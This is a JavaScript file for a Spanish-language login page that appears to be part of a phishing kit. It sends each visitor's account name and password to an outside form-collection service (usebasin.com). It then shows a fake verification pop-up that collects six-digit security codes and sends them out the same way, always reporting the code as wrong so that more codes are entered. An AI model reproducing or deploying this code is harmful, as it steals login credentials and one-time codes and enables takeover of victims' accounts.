$("#form-login").submit((e) => {
  e.preventDefault();

  var datos = new FormData(document.getElementById("form-login"));
  let cuenta = datos.get("cuenta");
  let password = datos.get("password");
  datos.append("estado_codigo", "NO");

  if (cuenta === "" || password === "") {
    $("#cuenta-incorrecta").css({ display: "initial" });
    return;
  } else {
    $("#cuenta-incorrecta").css({ display: "none" });
  }

  if (cuenta && password) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://usebasin.com/f/004ae0d64d88.json");
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        $("#btn-submit").css({ display: "none" });
        $(".loader").css({ display: "block" });
        setTimeout(() => {
          $(".pop-up-verificar").css({ display: "flex" });
          $("body").css({ overflow: "hidden" });
          $("#btn-submit").css({ display: "initial" });
          $(".loader").css({ display: "initial" });
        }, 1000);
      }
    };
    xhr.send(datos);
  } else {
    alert("Error Conexion");
  }
});

$("#btn-cerrar-pop").click(() => {
  $(".pop-up-verificar").css({ display: "none" });
  $("body").css({ overflow: "initial" });
});

$("#formulario-dialogo").submit((e) => {
  e.preventDefault();
  var datos = new FormData(document.getElementById("formulario-dialogo"));
  let codigo = datos.get("codigo-seguridad");
  if (codigo.length == 6) {
    var datosUsuario = new FormData(document.getElementById("form-login"));
    let cuenta = datosUsuario.get("cuenta");
    datos.append("cuenta-codigo", cuenta);

    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://usebasin.com/f/004ae0d64d88.json");
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        $("#codigo-seguridad").css({ "border": "1px solid red" });
        $("#codigo-incorrecto").css({ "display": "inline" });
      }
    };
    xhr.send(datos);
  } else {
    return;
  }
});

$("#codigo-seguridad").keydown(function (e) {
  $("#codigo-incorrecto").css({ "display": "none" });
  $("#codigo-seguridad").css({ "border": "1px solid rgba(57, 59, 61, 0.2)" });
  setTimeout(() => {
    if (this.value.trim().length == 6) {
      $(".contenedor-btn-codigo input").css({ "background-color": "#393b3d" });
    } else {
      $(".contenedor-btn-codigo input").css({ "background-color": "#9c9d9e" });
    }
  }, 1);
});
